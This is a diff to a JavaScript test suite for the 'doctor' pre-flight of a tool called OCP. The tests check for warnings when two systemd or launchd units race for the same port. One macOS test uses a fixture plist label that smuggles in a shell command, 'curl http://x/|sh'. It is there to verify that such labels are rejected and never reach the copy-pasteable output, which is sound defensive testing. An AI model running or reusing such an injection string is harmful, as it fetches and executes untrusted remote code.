+    mockLatest: "v3.26.0",
+    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
+    mockPlatform: "linux",
+    run: (cmd) => {
+      if (cmd.includes("--user list-unit-files")) return "a.service enabled\n";
+      if (cmd.includes("list-unit-files")) return "b.service enabled\n";
+      if (cmd.includes("--user show")) return userShow;
+      if (cmd.includes("systemctl show")) return systemShow;
+      throw new Error("unexpected: " + cmd);
+    },
+  });
+  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
+  assert.ok(check, "two units on the same port from different trees must still warn — they race for the port and would serve DIFFERENT code to whoever wins");
+  assert.equal(check.level, "WARN");
+  assert.ok(check.message.includes("DIFFERENT working trees"), "message must call out that the trees differ");
+  assert.ok(check.message.includes("ocp-A") && check.message.includes("ocp-B"), "message must name both trees");
 });
 
 test("runDoctor: exactly one enabled OCP unit → no multi_unit_boot_race check pushed", async () => {
@@ -6889,7 +7164,12 @@ test("runDoctor: zero enabled units on either scope → no check pushed, no cras
   assert.equal(result.ready_to_upgrade, true);
 });
 
-test("runDoctor: systemctl missing entirely (every call throws) → degrades honestly, no check pushed, no crash", async () => {
+test("MED-5: runDoctor — systemctl missing entirely (every call throws) → pushes a visible INFO line, distinguishable from a verified-clear host", async () => {
+  // Before this fix, "unknown" pushed nothing at all — indistinguishable from a genuinely
+  // clear host in the JSON output. That matters because `systemctl --user ...` fails without
+  // XDG_RUNTIME_DIR/DBUS_SESSION_BUS_ADDRESS, which is exactly what `sudo`'s env_reset strips —
+  // so `sudo ocp update` on a host whose OCP is a SYSTEM unit (the #215 shape) silently
+  // degraded this whole check with no visible trace.
   const result = await runDoctor({
     skipNetwork: false,
     mockVersion: "v3.26.0",
@@ -6898,15 +7178,18 @@ test("runDoctor: systemctl missing entirely (every call throws) → degrades hon
     mockPlatform: "linux",
     run: (cmd) => { throw new Error("systemctl: command not found"); },
   });
-  assert.ok(!result.checks.some(c => c.id === "multi_unit_boot_race"),
-    "a missing systemctl must degrade to 'can't tell', never a false all-clear that fabricates a WARN or a crash that aborts doctor entirely");
+  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
+  assert.ok(check, "an 'unknown' verdict must now be visible in the output, not silently omitted");
+  assert.equal(check.level, "INFO", "must not be WARN (no confirmed conflict) or FAIL (must never block an upgrade)");
+  assert.ok(check.message.includes("could not verify"));
   assert.equal(result.ready_to_upgrade, true);
+  assert.equal(result.warn_count, 0, "INFO must not be counted as a warning");
 });
 
 test("runDoctor: skipNetwork=true skips the probe entirely, even when the injected run() would report a conflict", () => {
   // Proves the gate: skipNetwork must short-circuit before `run` is ever consulted — a test
-  // suite running with skipNetwork:true (the vast majority of this file's ~30 pre-existing
-  // doctor tests) must never touch a live systemctl/launchd, matching the existing
+  // suite running with skipNetwork:true (the vast majority of this file's pre-existing doctor
+  // tests) must never touch a live systemctl/launchd, matching the existing
   // service_running/oauth_ok block's own skipNetwork gate immediately above it in doctor.mjs.
   let runCalled = false;
   const result = runDoctor({
@@ -6920,6 +7203,55 @@ test("runDoctor: skipNetwork=true skips the probe entirely, even when the inject
     assert.equal(runCalled, false, "run() must never be invoked when skipNetwork is true");
     assert.ok(!r.checks.some(c => c.id === "multi_unit_boot_race"));
   });
+});
+
+console.log("\nMulti-unit boot-race pre-flight (issue #220) — full pipeline via runDoctor (macOS — MED-3 blocker: previously untested):");
+
+test("MED-3: runDoctor on darwin — WARN message uses launchctl, NEVER systemctl (systemctl does not exist on macOS)", async () => {
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456", bind: "127.0.0.1" })],
+    ["/Library/LaunchDaemons/com.company.ocpd.plist", ocpPlist({ label: "com.company.ocpd", port: "3456", bind: "0.0.0.0" })],
+  ]);
+  const result = await runDoctor({
+    skipNetwork: false,
+    mockVersion: "v3.26.0",
+    mockLatest: "v3.26.0",
+    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
+    mockPlatform: "darwin",
+    run: (cmd) => {
+      if (cmd.includes("for f in")) return blob;
+      if (cmd.includes("print-disabled")) return disabledLaunchctlBlob([["dev.ocp.proxy", false], ["com.company.ocpd", false]]);
+      throw new Error("unexpected: " + cmd);
+    },
+  });
+  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
+  assert.ok(check, "expected a multi_unit_boot_race check to be pushed");
+  assert.equal(check.level, "WARN");
+  assert.ok(!check.message.includes("systemctl"), "must never suggest a systemctl command on macOS — that binary doesn't exist there");
+  assert.ok(check.message.includes("launchctl disable"), "must suggest the real macOS remediation");
+  assert.ok(check.message.includes("dev.ocp.proxy") && check.message.includes("com.company.ocpd"), "message must name both units");
+});
+
+test("MED-3: runDoctor on darwin — a maliciously-labeled plist never reaches the WARN message (would otherwise be copy-pasteable into a shell)", async () => {
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
+    ["/Library/LaunchDaemons/evil.plist", ocpPlist({ label: 'evil"; curl http://x/|sh #', port: "3456" })],
+  ]);
+  const result = await runDoctor({
+    skipNetwork: false,
+    mockVersion: "v3.26.0",
+    mockLatest: "v3.26.0",
+    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
+    mockPlatform: "darwin",
+    run: (cmd) => {
+      if (cmd.includes("for f in")) return blob;
+      if (cmd.includes("print-disabled")) return disabledLaunchctlBlob([["dev.ocp.proxy", false]]);
+      throw new Error("unexpected: " + cmd);
+    },
+  });
+  // Only ONE valid unit remains once the malformed Label is rejected → clear, no WARN at all,
+  // so the dangerous string can never appear in doctor's output at all.
+  assert.ok(!result.checks.some(c => c.id === "multi_unit_boot_race"));
 });
 
 runAsyncTests().then(() => Promise.all(pendingAsync)).then(() => {
